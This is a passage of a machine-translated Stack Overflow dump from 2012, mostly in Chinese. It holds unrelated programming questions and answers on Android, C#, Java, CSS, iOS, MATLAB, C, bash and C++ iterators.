允许机器人进行会话的问题在于，在某些情况下，恶意机器人不会在它在您网站上爬取的页面中保持 cookie 状态。因此，机器人对您网站的每次点击都会生成一个新会话。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-10-12T08:39:59.813

大多数机器人只会忽略会话 ID，因为他们知道它并不是 URL 的一部分。否则他们将不得不索引 index.php?sid=ABC、index.php?sid=BBC、index.php?sid=CBC 等页面。因为他们知道这是同一个页面，他们将忽略会话 ID。

为什么不直接根据 user_agent 阻止机器人？除了 ip 地址，不能真正阻止使用 user_agent 识别自己的机器人。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-10-12T18:55:31.843

这是我发现的东西-

1.  搜索机器人也可能会获取会话 ID，并且可能会为同一页面编制数百次或更多次的索引，因为大多数机器人不会保留其 cookie 状态。这将意味着重复的内容索引，并可能严重影响我们的搜索引擎排名。

2.  因为机器人在设计上会忽略 cookie 标头，所以它不会在每个后续请求中发回确认。实际上，机器人的每个请求都在创建一个新会话。大型站点上的攻击性机器人可以创建数百甚至数千个虚拟会话，这些会话会占用内存空间，直到它们过期

# android - 使用对话框解除功能时 AsyncTask 中的 Invocationtargetexception

> ID：12587526
> 
> 赞同：0
> 
> 时间：2012-09-25T16:50:00.493
> 
> 标签：android, android-asynctask

我有关于将 AsyncTask 与 ProgressDialog 一起使用的问题。在我调用解除方法后出现异常。我发现了很多与此相关的问题，答案是“把它放在 PostExecute() 中”。然而它不起作用......

```
public class Testing2 extends Activity {

private static final int PROGRESS = 0x1;

private ProgressBar mProgress;
private int mProgressStatus = 0;
private ProgressDialog dialog;
private Handler mHandler = new Handler();

protected void onCreate(Bundle icicle) {
    super.onCreate(icicle);

    setContentView(R.layout.done);

    mProgress = (ProgressBar) findViewById(R.id.progressbar);

    new Testing().execute(1,2,3);

}
private class Testing extends  AsyncTask<Integer, Integer, Integer> {

       protected void onPreExecute()
       {
           ProgressDialog dialog = new ProgressDialog(this);
               dialog.setMessage("dasdasd");
               dialog.setIndeterminate(true);
               dialog.setCancelable(false);
               dialog.show();

       }
     protected Integer doInBackground(Integer... urls) {

           Integer totalSize = 1;

           return totalSize;
       }

       protected void onProgressUpdate(Integer... progress) {

       }

       protected void onPostExecute(Integer result) {
           dialog.dismiss();
       }
   }
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T16:53:55.157

您正在将 ProgressDialog 分配给局部变量而不是字段`dialog`
所以而不是

```
ProgressDialog dialog = new ProgressDialog(this); 
```

采用

```
dialog = new ProgressDialog(Testing2.this); 
```

如果您在 doinbackground 中没有做太多事情，我怀疑进度条会出现。如果您想测试功能，请在 doinbackground 中至少拨打 2 秒钟的睡眠电话

# vim - 可以将 Aptana 独立与 vim 与 Mac 一起使用吗？

> ID：12587529
> 
> 赞同：0
> 
> 时间：2012-09-25T16:50:10.780
> 
> 标签：vim, aptana, aptana3

我刚刚开始进行 Ruby on Rails 开发。

我正在努力做到两全其美。我喜欢像使用 vim 一样仅使用键盘处理文件。但是从命令行打开并查找文件是一件麻烦事。

我希望能够单击在 Aptana 中打开的文件，然后能够使用 vim 命令在它周围导航以进行实际编辑。

我还没有找到任何明确的解决方案来让它在 Mac 上运行。我尝试在帮助>>安装新软件下使用 Aptana 为它安装软件，链接到此处：[http](http://satyavvd.blogspot.com/2010/05/aptana-studio-with-vi-emulation.html) ://satyavvd.blogspot.com/2010/05/aptana-studio-with-vi-emulation.html但链接是2岁我不知道如何让它运行。

有没有人让这个工作？

我正在使用 Aptana 3.2.2

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-25T19:17:18.200

您知道您可以右键单击文件并选择要使用的编辑器，对吗？或者将任何编辑器（内部或外部）分配给 Aptana 首选项中的任何文件类型？

Aptana 基于 Eclipse，所以在一个中工作的所有 Vi(m) 插件都可能在另一个中工作。

看看这五个插件：

*   [说唱歌手](http://vrapper.sourceforge.net/home/)

    具有许多 Vi(m) 键绑定的“常规”Eclipse 编辑器。

*   [插件](http://www.viplugin.com/viplugin/)

    同上，付费软件。

*   [可行的](https://marketplace.eclipse.org/content/viable-vim-eclipse)

    同上，付费软件。

*   [vim插件](http://sourceforge.net/projects/vimplugin/)

    在 Eclipse/Aptana 中运行 Vim。我认为它不适用于Mac。

*   [攀登](http://sourceforge.net/projects/eclim/)

    Eclipse 和 Vim 通过服务器进行通信。

但是，如果您只想要一种更方便的方式在 Vim 中打开文件，我无法推荐足够的[CtrlP](http://www.vim.org/scripts/script.php?script_id=3736)。您也可以尝试类似但不同的[FuzzyFinder](http://www.vim.org/scripts/script.php?script_id=1984)、[LustyExplorer](http://www.vim.org/scripts/script.php?script_id=1890)或[Command-T](http://www.vim.org/scripts/script.php?script_id=3025)）或者您可以更熟悉 Vim 的`:e **/foo<Tab>`.

# c# - 显示和隐藏模式弹出扩展器不起作用

> ID：12587530
> 
> 赞同：1
> 
> 时间：2012-09-25T16:50:12.947
> 
> 标签：c#, ajax, modalpopupextender

大家好，我有一个模式弹出扩展器设置为隐藏的链接按钮。所以当我想使用它时，我正在做

```
protected void ProcessFileBtn_OnClick(object sender, EventArgs e)
{
    WaitModalPopupExtender.Show();
    //DO STUFF
    WaitModalPopupExtender.Hide();
} 
```

过程需要一段时间，但没有模态弹出扩展器显示，当我创建一个按钮只是为了执行它的显示功能时，它可以工作，但是当我添加这个时

```
protected void Test_Click(object sender, EventArgs e)
{
    WaitModalPopupExtender.Show();
    System.Threading.Thread.Sleep(5000);
    WaitModalPopupExtender.Hide();

} 
```

什么都没有出现。有什么想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T16:59:59.987

它行不通。为什么...？？第一个请求发送到服务器。

```
WaitModalPopupExtender.Show();----Executed---But no response send to Client
System.Threading.Thread.Sleep(5000);----Executed---But no response send to Client
WaitModalPopupExtender.Hide();----Executed---Now its time to send the response 
```

现在您可以期待将发送到客户端的输出

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T16:55:32.783

没有看到所有代码很难说，但我相信`PostBack`当您单击链接按钮时页面正在执行。当页面进行回发时，它会刷新，因此您`ModalPopupExtender`不会显示。我认为您正在寻找并`Ajax`要求做您想做的事，我很确定在处理数据时会显示一个等待窗口。

# c# - 从方法 .NET 4.0 将字符串打印到控制台

> ID：12587534
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:50:18.823
> 
> 标签：c#

[昨天我在这里](https://stackoverflow.com/questions/12570272/writing-to-the-console-from-a-method-net-4-0)问了一个关于方法如何写入控制台的问题。今天，我编写了这个快速的小程序，但它并没有像我想象的那样工作。链接中的程序从未调用 Main 方法向控制台写入任何内容，但文本仍会出现在那里。我尝试使用下面的小片段遵循相同的逻辑，但它没有做任何事情。为什么下面的程序没有向控制台写入单词“hello”？编辑：[链接在这里](https://stackoverflow.com/questions/12570272/writing-to-the-console-from-a-method-net-4-0)

```
using System;
class DaysInMonth
{
    static void Main(string[] args)
    {
        int[] DaysInMonth = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };
        Console.Write("enter the number of the month: ");
        int month = Convert.ToInt32(Console.ReadLine());
        Console.WriteLine("that month has {0} days", DaysInMonth[month - 1]);

    }
    static void WriteIt(string s)
    {
        string str = "hello";
        Console.WriteLine(str);
    }
} 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-25T16:52:12.947

The linked program creates a timer which has an event handler which writes to the console. Every time the timer "ticks", it will call `TimerHandler`.

The code you've posted in the question doesn't have anything like that - nothing refers to `WriteIt` in any way, shape or form.

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-25T16:52:19.010

> Why isn't the program below writing the word "hello" to the console?

You never call the `WriteIt` method in your `Main`, so it's never used.

Change your code to call it, ie:

```
static void Main(string[] args)
{
    WriteIt("World"); // Call this method 
```

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-09-25T16:53:15.663

In the linked question the method `TimerHandler` is invoked by the `System.Timers.Timer` instance set up in `Main`. Nothing invokes `WriteIt` in this program's `Main` and so it is never invoked.

```
// In the linked question's Main method
// Every time one second goes by the TimerHandler will be called
// by the Timer instance.
Timer tmr = new Timer();
tmr.Elapsed += new ElapsedEventHandler(TimerHandler);
tmr.Interval = 1000;
tmr.Start(); 
```

To make it work you simply need to call `WriteIt`:

```
static void Main(string[] args)
{
    int[] DaysInMonth = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 };
    Console.Write("enter the number of the month: ");
    int month = Convert.ToInt32(Console.ReadLine());
    Console.WriteLine("that month has {0} days", DaysInMonth[month - 1]);
    WriteIt("Greetings!"); // Now it runs
} 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-25T16:52:13.770

You're never calling your `WriteIt` method from `Main`

Inside `Main` you should be calling the method:

```
static void Main(string[] args)
{
    WriteIt("Hello");
} 
```

As a note: Your `WriteIt` method doesn't really need the `string` parameter. You're not using the value passed in anywhere. You should either write the passed in string to the `Console`, or not have the parameter at all.

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2012-09-25T16:53:21.323

因为你不调用方法`WriteIt`。

```
int[] DaysInMonth = { 31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31 }; 
Console.Write("enter the number of the month: "); 
int month = Convert.ToInt32(Console.ReadLine()); 
Console.WriteLine("that month has {0} days", DaysInMonth[month - 1]); 
WriteIt("some string"); <====== //add this 
```

# java - 具有超类引用变量的 Java 子类对象中的方法重载/覆盖

> ID：12587539
> 
> 赞同：3
> 
> 时间：2012-09-25T16:50:33.233
> 
> 标签：java, class, inheritance

```
 class A{
 void m1(A a) {System.out.print("A");}
  } 
  class B extends A{
  void m1(B b) {System.out.print("B");}
  } 
  class C extends B{
  void m1(C c) {System.out.print("C");}
  }

 public class d {

 public static void main(String[] args) {

  A c1 = new C(); C c2 = new C();c1.m1(c2);

 }} 
```

此代码的输出是`'A'`.

但是，如果我将 A 类修改为：

```
 class A{
 void m1(C a) {System.out.print("A");}
  } 
```

那么输出是`'C'`. 有人可以解释一下这段代码是如何工作的吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-25T16:54:50.047

（通过对参数类型和实现使用相同的继承层次结构，您已经使这比需要的更加混乱。将它们分开可能有助于在您的脑海中简化它。）

的类型`c1`是`A`。因此，在计算要调用哪个*方法签名*时，编译器只能查看在`A`.

所以在第一种情况下，编译器将调用`m1(A)`; 在第二种情况下，编译器将调用`m1(C)`.

现在在第一种情况下，该`m1(A)`方法永远不会被覆盖，因此实际上执行时类型`c1`是无关紧要的。

在第二种情况下，`m1(C)`被 覆盖`C`，因此`C`调用 in 中的实现，因为执行时类型`c1`是`C`。

所以请记住：

*   *重载*解析（调用哪个方法签名）在编译时根据方法目标和参数表达式的编译时类型确定
*   该方法签名（*覆盖*）的实现基于*执行*时目标对象的实际类型。

# php - jquery mobile多页加载两次

> ID：12587540
> 
> 赞同：0
> 
> 时间：2012-09-25T16:50:35.453
> 
> 标签：php, html, jquery-mobile

问题是在android模拟器、opera mini或opera mobile中，页面加载一次。但是在黑莓 8530 原生浏览器中，**页面加载了两次**。

当我使用时出现问题

```
echo '<a href="link.php" data-role="button" data-icon="star">Go to link</a>'; 
```

但是如果我放 rel="external"，那么它会刷新年龄并且 ajax 动画消失。

```
 echo '<a href="link.php" data-role="button" data-icon="star" rel="external">
Go to link</a>'; 
```

**那么在不丢失任何动画和仅加载一次页面的情况下转到下一页的标准方法是什么？**

注意：我不使用那些单页导航之类`<a href="#link.php">`的，没有人可以在单页中制作一个大网站，单页模板是不切实际的，是制作网页的最糟糕的形式。所以我使用正常`<a href="link.php">`转到下一页。**使用多页模板有问题吗？**

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-10-17T19:00:47.617

您是否尝试过使用 target="_blank"？这是 A 标签的标准功能，受 BlackBerry Browser 支持。

转到链接将打开一个新窗口。

# php - IMAP PHP：如何在会话之间为电子邮件保留唯一 ID？

> ID：12587541
> 
> 赞同：0
> 
> 时间：2012-09-25T16:50:34.880
> 
> 标签：php, email, imap

我正在将电子邮件从 IMAP 提取到我的数据库中，然后，使用我的应用程序，您可以删除电子邮件、下载附件等。

但为了能够做到这一点，我需要在我的数据库中存储该电子邮件的 ID，以便稍后通过 IMAP 访问实时电子邮件。

**我怎样才能得到这个ID？**可能吗？我听到了不同的答案。

编辑：我正在使用 Zend_Mail_Storage_Imap，但感谢任何帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T23:13:45.240

您需要`UID`，它在会话之间引用相同的电子邮件。

（至少，只要`UIDVALIDITY`文件夹在会话之间没有改变）。

# css - 小型显示器的定位问题

> ID：12587548
> 
> 赞同：0
> 
> 时间：2012-09-25T16:51:08.227
> 
> 标签：css, html, css-float

这种设置，在我的 27 英寸显示器上，图像库对我来说看起来很正常，它位于我身体的中心。但是当我在 15 英寸显示器上查看它时，它在右侧几英寸处。现在，我知道它与“画廊”css 有关，因为 div 可能会将其推到右侧。我的问题是，尽管显示器的宽度不同，是否有更有益的方法让它保持静止？我对两列布局前景有点困惑，因为它不会移动到之前的位置。

```
<div id="gallery">
<div class="html5gallery" data-width="400" data-height="225" style="display:none>
<img src="images/mr.magic.jpg" alt="Mr. and Mrs. Magic">
<img src="images/mr-magic-2.jpg" alt="Mr. and Mrs. Magic">
<img src="images/mr-magic-3.jpg" alt="Mr. and Mrs. Magic">
<img src="images/mr-magic-4.jpg" alt="Mr. and Mrs. Magic">
<img src="images/mr-magic-5.jpg" alt="Mr. and Mrs. Magic">
<img src="images/david.jpg" alt="Mr. and Mrs. Magic with David Copperfield">
<img src="images/david-2.jpg" alt="Mr. Magic with David Copperfield">
<img src="images/seigfried.jpg" alt="Mr. Magic with Seigfried and Roy">
</div>
</div>

#gallery {
position: relative;
left: 950px; 
top: -560px;
float: left; padding:0; margin:0 
} 
```

我很感激你们花时间研究这些问题，只能希望得到一个好的答案。感谢您抽出时间来阅读。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T20:05:02.293

我不擅长 CSS，但是...

left:950px 将意味着 div 将始终距父 div 的左侧 950px （屏幕可能在您的情况下）。所以在较小的屏幕上，它会出现在更右侧。

相反，尝试使用 % 或 px 设置 div 的宽度，然后将左右边距设置为自动。就像是：

```
#gallery {
position:relative;
width:50%;
margin: 0 auto;
top:-560px;
} 
```

# c - 缺少声明标识符

> ID：12587552
> 
> 赞同：1
> 
> 时间：2012-09-25T16:51:26.777
> 
> 标签：c

我之前有一个关于这个主题的问题，但我提出了这个错误，我似乎没有注意到它有什么问题。我认为这可能在于将 args 分配给字符串。

编辑：

```
void replace(char* string_a, char* string_b, char* string_f)
{
}

int main(int argc, char *argv[])
{
     if(argc < 4)
     { 
         printf("Not enough arguments\n");
         return 0;
     }

     replace(argv[1],argv[2],argv[3]);
} 
```

奇怪的是主函数必须在替换函数之后，否则编译器会抱怨。我得查一下为什么。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:52:59.310

This is not valid C:

```
 char string_a[] = argv[1]; 
```

At compile time, the compiler can never figure out how much memory should be needed to store `argv[1]`. So this is not possible.

However, `argv[1]` is a pointer, and you can assign variables of the right type to pointers. So you could do:

```
const char *string_a = argv[1]; 
```

However, both `argv[1]` and `string_a` are now backed by the exact same piece of memory. (And this memory is likely read-only).

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:27:48.903

做这样的事情：

```
int main(int argc, char *argv[]) {   
    if(argc < 4) {
        printf("Not enough arguments\n");
        return 0;
    }

    string s=argv[1];
    string s1=argv[2];
    string s2=argv[3]; 
    replace(s,s1,s2);    
} 

void replace(s,s1,s2) { 
    //statements
} 
```

# java - 如何使用 RedLaser 库进行扫描并将条形码返回给 ScanBarcodeActivity？

> ID：12587553
> 
> 赞同：1
> 
> 时间：2012-09-25T16:51:25.940
> 
> 标签：java, android, android-activity, barcode-scanner

我正在使用 RedLaser 库扫描产品的条形码。我的课程在 BarcodeScanActivity 之后扩展。方法**onScanStatusUpdate**用于不间断地获取条形码。当我将条形码保存到数据库时，它会在循环中保存一个条形码。我正在扫描条形码并将其保存到数据库中的一项活动。如何暂停**onScanStatusUpdate**方法，并在移动到下一个条形码后恢复它？

# matlab - Matlab非线性、多参数曲线拟合问题

> ID：12587555
> 
> 赞同：0
> 
> 时间：2012-09-25T16:51:27.557
> 
> 标签：matlab, curve-fitting, least-squares

我正在尝试实施一个例程来拟合我的实验中的电泳数据。

目的是根据数据集中峰的面积，从电泳图中峰的相对面积推导出生物分子相互作用的动力学参数。

由于所有相关的微分方程都是已知的，并且方程组具有解析解，如下所述：

[解析解手稿](http://www.yorku.ca/skrylov/Publications/Anal_Chem_2004_v76_pp1507-1512.pdf)

我开始在 matlab 中输入相关方程（来自参考手稿的 6、8、13，...）。

这样创建的函数有效，我可以用它来模拟相互作用物种的电泳图。

显然，我现在想使用该函数来拟合实验数据并检索参数（总共 8 个，Va、Vc、MUa、MUc、k、A0、C0、基线噪声）。

其中一些显然是相关的。示例值可能是（以了解它们的大小）：

```
params0 = [ ...
           8.44E-02; ... % Va
           1.25E-01; ... % Vc
           5.32E-05; ... % MUa
           8.87E-05; ... % MUc
           4.48E-03; ... % k
           6.06E-01; ... % A0
           3.00E-00; ... % C0
           4.64E-03 ...  % noise
         ]; 
```

我的问题是，如果我提供实验数据并尝试类似 lsqcurvefit 的方法：

```
[x,resnorm,residual] = lsqcurvefit(@(param,xdata) Electropherogram2(param,xdata,column), params0, time, ydata,lb, ub); 
```

我经常得到非常糟糕的结果，因为我要么用完了迭代，要么达到了一些（显然拟合不佳）局部最小值或其他什么......

只有当我对起始值和允许的间隔进行大量修改（即因为我通过其他实验知道可能的值）时，我才会或多或少地得到合适的拟合，但即便如此，拟合也不如原始报告中报道的那么好手稿（图 3）。

该手稿的作者使用 Excel 求解器，并且非常友好地提供了图 3 中使用的原始数据，但如果没有几乎字面上提供几乎正确的起始值，我似乎仍然无法得到与他们一样好的拟合。

我没有足够的经验知道我可以调整什么来减少这个过程的反复试验。

像全局优化工具箱这样的东西对我有帮助吗？

欢迎任何提示...

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-01T13:31:58.873

在上述论文（“分析解决方案手稿”）中，暗示自由优化参数是五个（Va、Vc、MUa、MUc、k）而不是八个，因为可以从它们的代表方程计算出（Aeq/Ceq）比率, 等式。8 代表 Aeq 和（显然）eq。6 为 Ceq。

在我看来，更令人不安的是模型中出现了以下产品，由自由优化参数组成：

1.  方程中的 k 和 Va。12
2.  方程中 epsilon_A 中的 MUc 和 Va。12
3.  方程中 epsilon_A 中的 MUa 和 Vc。12

一般来说，当自由参数对出现在非线性模型中时，非线性优化算法在优化自由参数方面存在合理的问题。

# ios - 具有固定页眉或页脚的 UIViewController，如 UITableViewController

> ID：12587560
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:51:40.920
> 
> 标签：ios, uiviewcontroller, header, uitableview, footer

在 uitableviewcontroller 中，您有这个页眉和页脚，在滚动时分别固定在顶部和底部。我想知道在任何苹果制作的库类中是否有这样的东西，它有固定的页脚和页眉，不是 uitableviewcontroller，因为我不想滚动

```
UITableViewController 
```

对比

```
UIViewController 
```

我正在考虑将视图自定义添加到常规 uiviewcontroller 但我只是想确保我没有重新发明轮子

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:41:59.207

UIViewController 没有页眉或页脚。如果您想要其中任何一个，则需要像您提到的那样将视图作为子视图添加到控制器。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-17T03:15:34.957

UIViewControllers 可以有页眉和页脚视图，这些与 UITableView 的页眉/页脚视图不同，因为 UITableView 的页眉/页脚视图包含在 UIScrollView 中。

标题视图的一个示例是包含在 UINavigationController 中的 UINavigationBar。页脚视图示例是 UITabBarController 的 UITabBar。

如果您希望实现自定义页眉/页脚视图，请通过将它们添加到 UIViewController 视图层次结构来手动实现它们，然后覆盖这些方法。

```
-(UIView*)rotatingFooterView{
  return _customFooterView;
}

-(UIView*)rotatingHeaderView{
  return _customHeaderView;
} 
```

[http://developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/Reference/Reference.html#//apple_ref/occ/instm/UIViewController/rotatingHeaderView](http://developer.apple.com/library/ios/#documentation/uikit/reference/UIViewController_Class/Reference/Reference.html#//apple_ref/occ/instm/UIViewController/rotatingHeaderView)

# jquery - CSS Class Nth Child 选择器

> ID：12587562
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:51:44.267
> 
> 标签：jquery, html, css, forms, css-selectors

这是我的代码：[小提琴](http://jsfiddle.net/WajLA/15/)

我不明白我做错了什么。我发现在这一行：

```
<label>City<font color="red">*</font>: <input type="text" name="city" id="city" /></label><br/> 
```

如果您删除：

```
</label><br/> 
```

出于某种原因，它有效。我不知道为什么。任何想法我做错了什么？谢谢

编辑：抱歉忘了提到什么有效。我希望第一个和第二个提交按钮的样式不同。因此，对于第二个表单上的提交按钮，我使用了 nth-child 选择器，但由于某种原因，它没有对第二个提交按钮应用正确的样式更改。就像我说的，如果你出于某种原因移除上面的部分，它会起作用。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:05:54.407

你为什么不给按钮不同的类，因为它让你的生活更轻松..首先使用简单的选择器..如果这不起作用，那么去其他人..

接下来不要使用字体标签..用跨度替换它并给它一个带有红色字体的错误类..

```
input[type="submit"]
{
    padding:4px 7px;
    background:#CC0000;
    border:0px;
    position:relative;
    top:0px;
    border-bottom: 1px double #660000;
    border-top: 1px double #660000;
    border-left:1px double #FF0033;
    border-right:1px double #FF0033;
}

.button1
{
    margin:0 0 10px 0;
    color: #FFF;
    left:0px;
    width:100px;
}

.button2
{
    margin:0 0 5px 0;
    color: #00F;
    left:50px;
    width:150px;

}

.error
{
    color: red;
} 
```

我将所有通用属性放在一个类中。然后按钮 1 和按钮 2 将具有按钮的特定属性。这使您的代码更清晰，因为您的文档中没有任何重复的样式。​检查这个[FIDDLE](http://jsfiddle.net/sushanth009/WajLA/34/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-25T17:06:06.833

你做错了很多事情，但重要的是：

> label 元素最多可以包含一个 input、button、select、textarea 或 keygen 后代。

您有一个包含两个输入（名字 + 姓氏）的标签。

你也不应该使用字体标签，有 CSS 是有原因的。

第n个孩子的问题：

> 这个伪类根据元素在父元素的子元素列表中的位置来匹配元素。

参考：[http ://reference.sitepoint.com/css/pseudoclass-nthchild](http://reference.sitepoint.com/css/pseudoclass-nthchild)

使用不同的类或 ID，最简单的方法。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-25T17:15:37.787

CSS 代码：`div.box .button:nth-of-type(2)`

没有元素 div.box .button:nth-of-type(2) 它是`div.box .button:nth-of-type(1)`. 如需更多参考，请访问以下链接 [http://css-tricks.com/the-difference-between-nth-child-and-nth-of-type/](http://css-tricks.com/the-difference-between-nth-child-and-nth-of-type/)。

# cocoa-touch - 本地视频无法在 iOS 6 iPad 应用程序中播放

> ID：12587566
> 
> 赞同：1
> 
> 时间：2012-09-25T16:52:04.790
> 
> 标签：cocoa-touch, ipad, ios6

我之前没有在 iOS 中播放过视频文件，所以我不确定我是否只是遗漏了一些东西。播放器打开，但卡在加载动画中，我无法点击完成按钮。难道是我的视频文件不受支持？我为ipad编码。

```
#import "ViewController.h"

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad
{
    [super viewDidLoad];
    // Do any additional setup after loading the view, typically from a nib.

    UIButton *video_btn = [UIButton buttonWithType:UIButtonTypeRoundedRect];
    video_btn.frame = CGRectMake(0, 0, 100, 50);
    [video_btn setTitle:@"Moonrise" forState:UIControlStateNormal];
    [video_btn addTarget:self action:@selector(playMovie:) forControlEvents:UIControlEventTouchUpInside];
    [self.view addSubview:video_btn];

}

-(IBAction)playMovie:(id)sender
{

    NSString *filepath   =   [[NSBundle mainBundle] pathForResource:@"moonrise" ofType:@"mp4"];
    NSURL    *fileURL    =   [NSURL fileURLWithPath:filepath];
    MPMoviePlayerController *moviePlayerController = [[MPMoviePlayerController alloc] initWithContentURL:fileURL];
    [self.view addSubview:moviePlayerController.view];
    moviePlayerController.fullscreen = YES;
    [moviePlayerController play];

}

- (void)didReceiveMemoryWarning
{
    [super didReceiveMemoryWarning];
    // Dispose of any resources that can be recreated.
}

@end 
```

我得到这个作为输出：

```
2012-09-25 12:47:56.206 App[4895:c07] [MPAVController] Autoplay: Disabling autoplay for pause
2012-09-25 12:47:56.207 App[4895:c07] [MPAVController] Autoplay: Disabling autoplay
2012-09-25 12:47:56.221 App[4895:c07] [MPAVController] Autoplay: Disabling autoplay for pause
2012-09-25 12:47:56.222 App[4895:c07] [MPAVController] Autoplay: Disabling autoplay
2012-09-25 12:47:56.226 App[4895:c07] [MPAVController] Autoplay: Skipping autoplay, disabled (for current item: 1, on player: 0)
2012-09-25 12:47:56.255 App[4895:c07] [MPAVController] Autoplay: Enabling autoplay 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-25T17:40:57.363

尝试将您的 MPMoviePlayerController 设置为属性。

```
@property (strong, nonatomic) MPMoviePlayerController *moviePlayerController; 
```

* * *

要自动关闭，您必须在 MPMoviePlayerController 中设置通知。像这样：

```
[[NSNotificationCenter defaultCenter] addObserver:self
                                         selector:@selector(videoFinishedCallback:)
                                             name:MPMoviePlayerPlaybackDidFinishNotification
                                           object:moviePlayerController]; 
```

这将在视频结束时调用函数 - videoFinishedCallback。然后，您实现回调：

```
- (void) videoFinishedCallback:(NSNotification*)aNotification
{
    //remove notification
    [[NSNotificationCenter defaultCenter] removeObserver:self
                                                    name:MPMoviePlayerPlaybackDidFinishNotification
                                                  object:object:moviePlayerController];

    // here you set your code to remove the video
    // for example, you can remove from superview and set value to nil
} 
```

# c++ - C++ 和 boost::python

> ID：12587567
> 
> 赞同：0
> 
> 时间：2012-09-25T16:52:06.243
> 
> 标签：c++, python, boost, python-embedding

我可以仅使用 boost:python 将 python 嵌入到我的应用程序中吗？我需要任何额外的库来与我的应用程序一起使用吗？

或者是否有任何可嵌入的语言本身支持 unicode 字符并且不需要任何库来与应用程序一起使用

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T19:17:36.877

要将 Python 集成到 C++ 应用程序中，您可以使用[Boost.Python](http://www.boost.org/doc/libs/1_51_0/libs/python/doc/)，但您也可以直接连接[Python C API](http://docs.python.org/c-api/intro.html)。

对于这两种方法，您都需要 Python 库，对于 Boost.Python 方法，您还需要链接到 Boost.Python 库。

# bash - Bash - Identify files not referenced by other files

> ID：12587576
> 
> 赞同：-1
> 
> 时间：2012-09-25T16:52:23.303
> 
> 标签：bash, sed, awk, grep

I have a website that runs off an OpenWRT router. I'd like to optimize the site by removing an files that aren't being used. Here is my directory structure...

```
 /www/images
 /www/js
 /www/styles
 /www/otherSubDirectories  <--- not really named that 
```

I'm mostly concerned about identifying images that are not used because those take the most space. But it would also be nice to identify style sheets and javascript files that are not being used. So, is there a way I can search /www and all sub directories and files and print a list of files in /www/images, /www/js, and /www/styles that are not referenced by any other files?

When I'm looking for files that contain a specific string I use this:

```
 find . | xargs grep -Hn 'myImage.jpg' 
```

That would tell me all files that reference the image. Maybe some variation of that?

Any help would be appreciated!

EV

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-25T17:19:52.240

考虑使用交叉引用程序（例如[lxr](http://lxr.sourceforge.net)）来解决这个问题。（我还没有验证 lxr 是否可以完成这项工作，但相信它可以。）如果现成的交叉引用程序不起作用，请寻找一个你知道的语言的开源交叉引用程序，并适应它。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-25T17:44:46.100

[瑞士锉刀](http://sourceforge.net/projects/swissfileknife/)是非常好的工具。

通过模糊内容分析找出哪些文件被其他文件使用（引用）

# c++ - reverse_iterators 和 base 的令人费解的 post 和 pre-increment 行为

> ID：12587577
> 
> 赞同：0
> 
> 时间：2012-09-25T16:52:34.583
> 
> 标签：c++, iterator

考虑玩具程序（post.cpp）：

```
#include <iostream>
#include <vector>

using namespace std;
int main() {
        vector<int > a;
        int i;
        for(i=0;i<10;i++)
                a.push_back(i);
        auto it=a.rbegin();
        while(it!=a.rend()) {
                if ((*it % 2)==0) {
                                cout << "about to erase "<<*it<<endl;
                                a.erase((it++).base());
                }
                else {
                        ++it;
                }
        }
        for(auto it2=a.begin(); it2 != a.end(); it2++) {
                cout << *it2 << endl;
        }
        return 0;
} 
```

我要做的是测试均匀性，然后删除当前数字，因为`(it++)`应该返回当前迭代器，然后推进迭代器。这是我得到的输出：

```
$ ./post 
about to erase 8
about to erase 6
about to erase 4
about to erase 2
about to erase 0
0
2
4
6
8 
```

但是，如果我将行更改`a.erase((it++).base());`为`a.erase((++it).base());`，我会得到正确的行为。为什么是这样？

有用的说明：我使用的是`base()`因为 reverse_iterators 不能用于`erase()`. 有一个应用程序，我想在向量上反向擦除东西。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-25T16:55:50.547

`base()`反向迭代器的 偏移 1。所以`rbegin().base() == end()`和`rend().base() == begin()`。

这只不过是这个反向循环的概括：

```
for (size_t i = 0; i != N; ++i)
{
    mutate(array[N - i - 1]);
}   //                 ^^^ 
```

循环以相反的顺序遍历数组，并注意我们如何`- 1`在“迭代器”上需要 a。

* * *

**更新：**现在让我们研究一下什么是反向迭代器：它只是一个双向迭代器的包装器。假设调用了反向迭代器`it`；然后它有一个普通的迭代器成员`it.base()`。例如，`v.rbegin().base() == v.end()`。当您说`++it`时，这只是`--it.base()`（从概念上）调用。真正的魔法是取消引用操作：这必须在底层迭代器之前给我们*一个元素：*

```
*it == *(it.base() - 1) 
```

